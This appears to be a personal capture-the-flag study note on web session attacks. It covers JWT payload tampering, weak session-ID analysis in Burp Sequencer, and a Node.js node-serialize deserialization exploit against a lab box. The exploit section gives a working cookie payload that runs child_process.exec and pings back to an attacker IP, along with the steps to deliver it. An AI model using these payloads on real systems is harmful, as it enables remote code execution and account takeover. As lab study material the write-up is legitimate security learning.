---
title: Web Session
date: 2026-08-15
ShowToc: true
draft: false
TocOpen: true
password:
isPrivate: true
tags:
  - blog
lastmod: 2026-08-26T03:17:41.524Z
---
# Box Info

* HTTP Cookies
* HTML5 Web Storage
* JSON Web Tokens (JWT)
* In-Memory Stores (Redis / Memcached)
* Traditional Databases (SQL / NoSQL)
* sso
* kerberos

### JSON Web Token (JWT)

* example

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJIVEItQWNhZGVteSIsInVzZXIiOiJhZG1pbiIsImlzQWRtaW4iOnRydWV9.Chnhj-ATkcOfjtn8GCHYvpNE-9dmlhKTCUwl6pxTZEA
```

JWT Header : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\
JWT Payload : eyJpc3MiOiJIVEItQWNhZGVteSIsInVzZXIiOiJhZG1pbiIsImlzQWRtaW4iOnRydWV9\
JWT Signature : ATkcOfjtn8GCHYvpNE-9dmlhKTCUwl6pxTZEA

![Pasted image 20260818115501.png](/ob/Pasted%20image%2020260818115501.png)

paste into https://www.jwt.io/  , https://jwt.lannysport.net/ , then change to username , and put back in the session or cookie

![Pasted image 20260821163152.png](/ob/Pasted%20image%2020260821163152.png)

RS256 , only HS256 can be change

### OAuth

To-Do

### SAML

To-Do

### Weak Session

![Pasted image 20260818134710.png](/ob/Pasted%20image%2020260818134710.png)

To analyze the entropy of session IDs, we can use `Burp Sequencer`. To do so, we right-click the login request in Burp and click on `Send to Sequencer`. Afterward, switch to the Sequencer Tab. Make sure that Burp automatically detected the session cookie in the `Token Location Within Response` field and that the `Cookie` option is selected. We could also specify a custom location if we wanted to analyze the entropy of a different field in the response. Afterward, start the live capture.

![Pasted image 20260818135721.png](/ob/Pasted%20image%2020260818135721.png)

very poor is the fin

![Pasted image 20260818140033.png](/ob/Pasted%20image%2020260818140033.png)

### Node & Express 's cookie to have rce

they used the `node-serialize` to generate the cookie

```
function authenticated(c) {
    if (typeof c == 'undefined')
        return false

    c = serialize.unserialize(c)

    if (c.sign == (crypto.createHash('md5').update(cookie_secret + c.user).digest('hex')) ){
        return true
    } else {
        return false
    }
}
```

Example Cookie

```
%7B%22user%22%3A%22admin%22%2C%22sign%22%3A%2223e112072945418601deb47d9a6c7de8%22%7D
```

```
{"user":"admin","sign":"23e112072945418601deb47d9a6c7de8"}
```

Full Code

```
const express = require('express')
const mongoose = require('mongoose')
const Article = require('./models/article')
const articleRouter = require('./routes/articles')
const loginRouter = require('./routes/login')
const serialize = require('node-serialize')
const methodOverride = require('method-override')
const fileUpload = require('express-fileupload')
const cookieParser = require('cookie-parser');
const crypto = require('crypto')
const cookie_secret = "UHC-SecretCookie"
//var session = require('express-session');
const app = express()

mongoose.connect('mongodb://localhost/blog')

app.set('view engine', 'ejs')
app.use(express.urlencoded({ extended: false }))
app.use(methodOverride('_method'))
app.use(fileUpload())
app.use(express.json());
app.use(cookieParser());
//app.use(session({secret: "UHC-SecretKey-123"}));

function authenticated(c) {
    if (typeof c == 'undefined')
        return false

    c = serialize.unserialize(c)

    if (c.sign == (crypto.createHash('md5').update(cookie_secret + c.user).digest('hex')) ){
        return true
    } else {
        return false
    }
}


app.get('/', async (req, res) => {
    const articles = await Article.find().sort({
        createdAt: 'desc'
    })
    res.render('articles/index', { articles: articles, ip: req.socket.remoteAddress, authenticated: authenticated(req.cookies.auth) })
})

app.use('/articles', articleRouter)
app.use('/login', loginRouter)


app.listen(5000)
```

### Exploit

https://opsecx.com/blog/exploiting-node-js-deserialization-bug-for-remote-code-execution

```
npm install node-serialize
```

```
┌─[✗]─[tester@parrot]─[~/Desktop/HTB/NodeBlog]
└──╼ $cat log.js 
var y = {
 rce : function(){
 require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
 },
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));

```

list the file of Serialized function and try it my host

```
┌─[tester@parrot]─[~/Desktop/HTB/NodeBlog]
└──╼ $cat log.js 
var y = {
rce : function(){
require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
}(),
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));

```

I will make the ping and reverse to cookie to ping me back

```
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ping -c 1 10.10.14.105', function(error, stdout, stderr){console.log(stdout)});}()"}
```

In the Decoder . rce --> url encode --> put in the cookie

![Pasted image 20260826111542.png](/ob/Pasted%20image%2020260826111542.png)

send it in the repeater

![Pasted image 20260826111521.png](/ob/Pasted%20image%2020260826111521.png)

Catch it

![Pasted image 20260826111731.png](/ob/Pasted%20image%2020260826111731.png)
